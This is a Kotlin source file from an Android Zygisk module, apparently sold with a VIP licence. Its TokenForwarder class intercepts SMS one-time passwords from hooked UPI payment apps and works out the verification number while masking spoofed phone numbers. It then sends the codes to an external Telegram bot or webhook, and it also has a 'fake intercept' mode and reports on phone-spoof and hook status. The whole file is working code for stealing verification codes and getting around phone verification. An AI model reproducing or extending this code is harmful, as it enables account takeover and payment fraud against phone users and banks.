package com.hivirtus.zygiskmode

import android.content.Context
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject

class TokenForwarder(
    private val configManager: ConfigManager,
    private val context: Context? = null
) {

    private val client = OkHttpClient()

    fun forward(otp: LastOtp): Boolean {
        val config = configManager.load()
        if (!config.autoForwardToken && !config.fakeInterceptTelegram) return false

        val peer = otp.rawPeer.ifBlank { otp.sender }
        val body = otp.body.ifBlank { otp.otp }
        if (!SmsMatcher.shouldForwardToTelegram(config, peer, body, otp.direction)) return false
        if (SmsMatcher.matchedHookedApp(config, peer, body) == null) return false

        val botToken = config.telegramBotToken
        val chatId = config.telegramChatId

        if (botToken.isBlank() || chatId.isBlank()) {
            if (config.forwardUrl.isBlank()) return false
            return forwardWebhook(config.forwardUrl, config.forwardMethod, otp)
        }

        return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp))
    }

    fun forwardFakeIntercept(otp: LastOtp): Boolean {
        val config = configManager.load()
        if (!config.fakeInterceptTelegram) return false
        val botToken = config.telegramBotToken
        val chatId = config.telegramChatId
        if (botToken.isBlank() || chatId.isBlank()) return false
        return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp, fakeIntercept = true))
    }

    fun sendTestMessage(botToken: String, chatId: String, health: ModuleHealth): Boolean {
        if (botToken.isBlank() || chatId.isBlank()) return false
        val config = configManager.load()

        val text = buildString {
            appendLine("📱 <b>Zygisk Menu</b>")
            appendLine("<b>Mode By @hivirtus @liqdy</b>")
            appendLine("────────────────")
            appendLine("<b>${escapeHtml(health.statusLine)}</b>")
            appendLine("📞 <b>Intercept No:</b> UPI verify number (auto per app)")
            appendLine("📦 Module ZIP: ${if (health.moduleInstalled) "Installed ✅" else "Missing ❌"}")
            appendLine("⚡ Zygisk Hook: ${if (health.zygiskLoaded) "Loaded ✅" else "Not loaded — reboot?"}")
            appendLine("📱 Phone Spoof: ${if (health.phoneSpoofReady) "Ready ✅ (${escapeHtml(health.spoofPhone)})" else "OFF / number missing ❌"}")
            appendLine("🆔 Sender ID: ${if (health.senderIdSet) "Set ✅" else "Missing — MESSAGE tab ❌"}")
            appendLine("🔐 VIP: ${if (health.licensed) "Active ✅" else "Not active ❌"}")
            appendLine("🌐 Root: ${escapeHtml(health.rootType)}")
        }
        return postTelegram(botToken, chatId, text)
    }

    private fun forwardTelegram(botToken: String, chatId: String, otp: LastOtp): Boolean {
        return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp))
    }

    fun buildZygiskMenuMessage(otp: LastOtp, fakeIntercept: Boolean = false): String {
        val config = configManager.load()
        val interceptNo = resolveUpiVerifyNumber(otp, config)
        val body = otp.body.ifBlank { otp.otp }.trim()
        val health = context?.let { ModuleHealthChecker.check(it) }

        return buildString {
            appendLine("📱 <b>Zygisk Menu</b>")
            appendLine("<b>Mode By @hivirtus @liqdy</b>")
            appendLine("────────────────")
            if (health != null) {
                appendLine("<b>${escapeHtml(health.statusLine)}</b>")
            }
            if (fakeIntercept) {
                appendLine("🎭 <b>Fake Intercept</b>")
            }
            if (otp.messageLabel.isNotBlank()) {
                appendLine("📲 <b>Hooked App:</b> ${escapeHtml(otp.messageLabel)}")
            }
            appendLine("📞 <b>Intercept No:</b> ${escapeHtml(interceptNo)}")
            if (body.isNotBlank()) {
                append(escapeHtml(body))
            }
        }
    }

    /**
     * UPI app ka verify number — SMS bhejne/waala peer (91221..., VM-PHONEPE, etc.)
     * Tumhara spoof / personal number Telegram pe nahi aata.
     */
    private fun resolveUpiVerifyNumber(otp: LastOtp, config: ModuleConfig): String {
        val rawPeer = otp.rawPeer.trim()
        if (rawPeer.isNotBlank() && !isSpoofOrPersonalNumber(rawPeer, config)) {
            return rawPeer
        }

        val sender = otp.sender.trim()
        val injectId = SmsMatcher.userSenderId(config)?.trim().orEmpty()
        if (sender.isNotBlank() && !isSpoofOrPersonalNumber(sender, config)) {
            if (sender != injectId || !SmsMatcher.isIndianMobileNumber(sender)) {
                return sender
            }
        }

        extractVerifyNumberFromBody(otp.body.ifBlank { otp.otp })?.let { return it }

        return rawPeer.ifBlank { sender }.ifBlank { "UPI-VERIFY" }
    }

    private fun isSpoofOrPersonalNumber(value: String, config: ModuleConfig): Boolean {
        val digits = normalizeDigits(value)
        if (digits.isBlank()) return false

        val blocked = personalNumberDigits(config).filter { it.isNotBlank() }

        return blocked.any { blockedDigits ->
            digits == blockedDigits ||
                (digits.length == 10 && blockedDigits.endsWith(digits)) ||
                (blockedDigits.length == 10 && digits.endsWith(blockedDigits))
        }
    }

    private fun personalNumberDigits(config: ModuleConfig): Set<String> = buildSet {
        add(normalizeDigits(configManager.readSpoofPhone()))
        add(normalizeDigits(config.mockPhoneSim1))
        add(normalizeDigits(config.mockPhoneSim2))
    }

    private fun normalizeDigits(value: String): String =
        value.replace(Regex("[^0-9]"), "")

    private fun extractVerifyNumberFromBody(body: String): String? {
        if (body.isBlank()) return null
        Regex("""(?<!\d)(91\d{10}|\d{10}|\d{6,12})(?!\d)""").findAll(body).forEach { match ->
            val candidate = match.groupValues[1]
            val config = configManager.load()
            if (!isSpoofOrPersonalNumber(candidate, config)) return candidate
        }
        return null
    }

    private fun escapeHtml(text: String): String {
        return text
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }

    private fun postTelegram(botToken: String, chatId: String, text: String): Boolean {
        val url = "https://api.telegram.org/bot$botToken/sendMessage"
        val payload = JSONObject()
            .put("chat_id", chatId)
            .put("text", text)
            .put("parse_mode", "HTML")
            .put("disable_web_page_preview", true)
            .toString()
        return postJson(url, payload)
    }

    private fun forwardWebhook(url: String, method: String, otp: LastOtp): Boolean {
        val config = configManager.load()
        val interceptNo = resolveUpiVerifyNumber(otp, config)
        val payload = JSONObject()
            .put("otp", otp.otp)
            .put("token", otp.body.ifBlank { otp.otp })
            .put("intercept_no", interceptNo)
            .put("direction", otp.direction)
            .put("telegram_format", buildZygiskMenuMessage(otp))
            .toString()

        val request = Request.Builder()
            .url(url)
            .method(method.uppercase(), payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }

    private fun postJson(url: String, payload: String): Boolean {
        val request = Request.Builder()
            .url(url)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        return try {
            client.newCall(request).execute().use { it.isSuccessful }
        } catch (_: Exception) {
            false
        }
    }
}
